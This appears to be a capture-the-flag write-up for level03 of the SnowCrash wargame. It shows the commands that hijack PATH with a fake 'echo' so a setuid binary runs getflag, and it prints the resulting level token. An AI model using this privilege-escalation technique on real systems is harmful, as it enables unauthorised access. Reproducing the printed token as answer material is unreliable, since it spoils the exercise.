In our home directory we can see :

```
level03@SnowCrash:~$ ls -l level03
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ ./level03
Exploit me
```
If you look at ./level3 with strings you can see a call to echo :
```
level03@SnowCrash:~$ strings ./level03
/usr/bin/env echo Exploit me
```

We can replace the echo command with a fake version that will provide us with the getflag command. This is possible because ./level03 has the permissions of the flag03 user.
```
`echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03`

```
Finally, run the executable to get the token for level04:

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```